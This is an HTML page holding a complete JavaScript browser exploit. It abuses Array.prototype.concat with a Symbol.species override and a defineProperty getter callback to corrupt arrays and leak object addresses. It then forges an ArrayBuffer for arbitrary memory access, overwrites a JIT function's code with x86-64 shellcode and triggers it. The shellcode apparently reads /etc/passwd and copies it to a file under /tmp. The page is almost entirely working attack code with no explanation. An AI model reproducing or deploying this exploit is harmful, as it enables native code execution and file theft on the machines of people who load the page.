<html>
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-store, must-revalidate">
    <meta http-equiv="expires" content="0">

<body>
    <div id="log"></div>
<script>
var reset = new Array(0x500); 
var ARRAYBUFFER_BACKSTORE_BUFFER_LEN = 0x1338;

var float64_converter = new Float64Array([0]);
var uint32_converter  = new Uint32Array(float64_converter.buffer);


var is_debug = false;
var global   = this;
global[2]    = {};

var g_ab_glob  = null;
var g_ab_map   = null;
var g_ab_proto = null;
var g_ab_elems = null;
var g_ab_unk1  = null;
var g_ab_unk2  = null;
var g_ab_unk3  = null;
var g_ab_unk4  = null;
var g_ab_unk5  = null;
var g_ab_unk6  = null;

var global_proxy = new Proxy([], {});

var global_text_0    = null;
var global_text_1    = null;
var global_text_2    = null;
var global_text_3    = null;
var global_text_4    = null;
var global_text_5    = null;

var global_fake_ab   = null;

function gc() {
    for (var i = 0; i < 0x10000; i++) {
        var zz = new String();
    }
}

function clear() {
    gc();
    gc();
}

function log(s) {
    var log = document.getElementById("log");
    var ele = document.createElement("span");
    ele.innerHTML = s;
    log.appendChild(ele);
    log.appendChild(document.createElement("br"));
}

function hex(d, flag) {
    if (d == undefined) return "0xUNDEFINED";
    var pad = "00000000";
    var str = d.toString(16);
    var ret = pad.substring(0, pad.length - str.length) + str; 
    if (flag) return "0x" + ret;
    else return ret;
}

function to_pointer(float64) {
    float64_converter[0] = float64;
    uint32_converter[0] |= 1;
    return float64_converter[0];
}

function un_pointer(float64) {
    float64_converter[0] = float64;
    uint32_converter[0] -= 1;
    return float64_converter[0];
}

function add64(float64, val) {
    float64_converter[0] = float64;
    uint32_converter[0] += val;
    return float64_converter[0];
}

function from_float(float64) {
    float64_converter[0] = float64;
    log(hex(uint32_converter[1].toString(16), true) + hex(uint32_converter[0].toString(16), false));
}

function is_pointer(float64) {
    float64_converter[0] = float64;
    return (uint32_converter[0] & 1) == true;
}

function dump_readable(leaked_array, size) {
    for (var i = 0; i < size; i++) {
        try {
            if (typeof leaked_array[i] != "symbol") {
                if (typeof leaked_array[i] == "number") {
                    log(i + " " + hex(leaked_array[i]));
                } else {
                    log(i + " " + leaked_array[i]);
                }
            }
        } catch (err) {

        }
    }
}

function find_custom_arraybuffer(leaked_array, size) {
    for (var i = 0; i < size; i++) {
        try {
            if (typeof leaked_array[i] != "symbol") {
                if (typeof leaked_array[i] == "object") {
                    if (leaked_array[i].byteLength == 0x7f000010) {
                        return leaked_array[i];
                    }
                }
            }
        } catch (err) {

        }
    }

    return false;
}

function malformed_double_array(len) {
    //var p = new Proxy([], {});
    var tmp = Object.prototype.defineProperty;

    class CustomArray extends Array {
        static get [Symbol.species]() { return function() { return global_proxy; } };
    }

    var corrupt = new CustomArray(len);
    for (var i = 1; i < 5; i++) {
        corrupt[i] = 0.1;
    }

    function evil_callback() {
        delete Object.prototype.defineProperty;
        log("malformed_double callback");
        corrupt.length = 1;
        gc();
        return tmp;
    }

    Object.prototype.__defineGetter__("defineProperty", evil_callback);

    return corrupt;
}

function malformed_object_array(len) {
    var p = new Proxy([], {});
    var tmp = Object.prototype.defineProperty;

    class CustomArray extends Array {
        static get[Symbol.species]() { return function() { return p; } };
    }

    var corrupt = new CustomArray(len);
    corrupt[0]  = {}

    for (var i = 1; i < 5; i++) {
        corrupt[i] = 0.1;
    }

    function evil_callback() {
        delete Object.prototype.defineProperty;
        log("malformed_object callback");
        corrupt.length = 1;
        gc();
        return tmp;
    }

    Object.prototype.__defineGetter__("defineProperty", evil_callback);

    return corrupt;
}

function leak_arraybuffer_stuff(corrupt) {
    for (var i = 0; i < corrupt.length; i++) {
        if (corrupt[i] == 1.0440219291549e-310 && corrupt[i+2] == 2e-323) {
            g_ab_glob  = corrupt[i-4];
            g_ab_map   = corrupt[i-3];
            g_ab_proto = corrupt[i-1];
            g_ab_elems = corrupt[i+1];
            g_ab_unk1  = corrupt[i+5];
            g_ab_unk2  = corrupt[i+6];
            g_ab_unk3  = corrupt[i+7];
            g_ab_unk4  = corrupt[i+8];
            g_ab_unk5  = corrupt[i+9];
            g_ab_unk6  = corrupt[i+10];
            return true;
        }
    }

    return false;
}

function leak_textobj(corrupt) {
    for (var i = 0; i < corrupt.length; i++) {
        if (corrupt[i] == 3.60739284464e-313 && corrupt[i+6] == corrupt[i+8] == corrupt[i+10] && 
                corrupt[i+7] == corrupt[i+9] == corrupt[i+11] == 0)
        {
            global_text_0    = corrupt[i+1];
            global_text_1    = corrupt[i+2];
            global_text_2    = corrupt[i+3];
            global_text_3    = corrupt[i+4];
            global_text_4    = corrupt[i+5];
            global_text_5    = corrupt[i+6];
            return true;
        }    
    }

    return false;
}

function leak_fake_array(corrupt) {
    for (var i = 0; i < corrupt.length; i++) {
        if (corrupt[i] == 1.90979621187e-313 && is_pointer(corrupt[i - 1]) && is_pointer(corrupt[i - 2]) && is_pointer(corrupt[i - 3]) && corrupt[i+1] != 1.0438097295758e-310) {
            global_fake_ab = add64(corrupt[i - 1], 0x10);
            return true;
        }
    }
    return false;
}

function dump64(a) {
    function f2u(a) {
        var f64 = new Float64Array(a);
        var u32 = new Uint32Array(f64.buffer);
        return u32;
    }

    var mem32 = f2u(a);
    for (var i = 0; i < mem32.length; i+=2) {
        log(i/2 + " " + hex(mem32[i+1].toString(16), true) + hex(mem32[i].toString(16), false));
        mem32[i] = null;
        mem32[i+1] = null;
    }

    mem32 = null;
}

// BBBBAAAA         = 156842099330.5098
// hi 0x1337        = 1.0438097295758e-310
// hi 0x1338        = 1.0440219291549e-310
// hi 0x31337       = 4.276394457658584e-309
// hi 0x31338       = 4.276415677616494e-309
// hi 0x21227       = 2.87995146754016e-309
// lo 0x4           = 2e-323 
// hi 0x9           = 1.90979621187e-313
// hi 0x1fffffffc   = 1.491665301108842e-154
// hi 0x7f000000c   = 5.486186852501141e+303
// hi 0x7f0000010   = 5.486207780403625e+303

var dummy = new Text("nilch");
var body = "eval('');";
for (var i = 0; i < 2000; i++)
    body += "a[" + i.toString() + "];";
var func = new Function("a", body);

func({});

var g_f64_obj = new Float64Array([1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310]);
clear();

var g_fake_ab = [1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310];
var g_arraybuffer_obj = new ArrayBuffer(ARRAYBUFFER_BACKSTORE_BUFFER_LEN);
var g_dataview_obj    = new DataView(g_arraybuffer_obj, 0, ARRAYBUFFER_BACKSTORE_BUFFER_LEN);
var g_text_obj        = new Text("blendin");
global[0] = g_arraybuffer_obj;
global[1] = g_text_obj;

g_text_obj[0] = new ArrayBuffer(0x31338);
g_text_obj[1] = g_f64_obj;
g_text_obj[2] = func;
g_text_obj[3] = global;
g_text_obj[4] = [1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310, 1.0438097295758e-310];
g_text_obj[5] = g_text_obj;
g_text_obj[6] = undefined;
g_text_obj[7] = 0;
g_text_obj[8] = undefined;
g_text_obj[9] = 0;
g_text_obj[10] = undefined;
g_text_obj[11] = 0;
//g_text_obj[3] = louie
//louie[2] = 1.0438097295758e-310
//
//var leaked_array = Array.prototype.concat.call(malformed_object_array(6544));
//dump_readable(leaked_array, 6544);
// index 4388

var leaked_double_array = Array.prototype.concat.call(malformed_double_array(0x2000));
leak_arraybuffer_stuff(leaked_double_array);
leak_textobj(leaked_double_array);
leak_fake_array(leaked_double_array);
dump64(leaked_double_array);
clear();
clear();

var louie = [2.87995146754016e-309, 2.87995146754016e-309, 2.87995146754016e-309, 2.87995146754016e-309, 2.87995146754016e-309, 2.87995146754016e-309, 2.87995146754016e-309,2.87995146754016e-309,2.87995146754016e-309,2.87995146754016e-309]
louie[0] = to_pointer(global_text_0);
louie[1] = to_pointer(global_text_1);
louie[2] = to_pointer(global_text_2);
louie[3] = to_pointer(global_text_3);
louie[4] = to_pointer(global_text_4);
louie[5] = to_pointer(global_fake_ab);

g_text_obj[4][0] = g_ab_map
g_text_obj[4][1] = g_ab_proto;
g_text_obj[4][2] = g_ab_proto;
g_text_obj[4][3] = 5.486207780403625e+303;
g_text_obj[4][4] = un_pointer(global_text_2);
g_text_obj[4][5] = 2e-323;

// louie holds pointers to our many different array objects :)
var leaked_array = Array.prototype.concat.call(malformed_object_array(185));
dump_readable(leaked_array, 185);

//alert(louie[5]);
var aaa = find_custom_arraybuffer(leaked_array, 185);
var f64 = new Float64Array(aaa);

// This is the address of the jit address
var g_jit_address = f64[7];

f64 = null;
g_text_obj[4][4] = g_jit_address;

var u32 = new Uint32Array(aaa);

var shellcode = [0x48c03148,0x3148f631,0xd23148ff,0x2fbb4850,0x2f706d74,0x53616161,0x50e18949,0x647773bb,0xbb485300,0x6374652f,0x7361702f,0xe7894853,0xb0f63148,0x48050f02,0x3148c789,0xec8148c0,0x00001000,0x001000ba,0xe6894800,0x8949050f,0xc03148c2,0x48f08949,0xb6bad231,0xbe000001,0x00000042,0xb0cf894c,0x48050f02,0x8948c789,0xd2894ce6,0x000001b8,0xbf050f00,0x00000001,0x00003cb8,0xf4050f00];

for (var i = 0; i < shellcode.length; i++) {
    u32[i] = shellcode[i];
}

if (is_debug) {
    alert("Attach me");
}

//Trigger the jit 
func({});
</script>
</body>
</html>
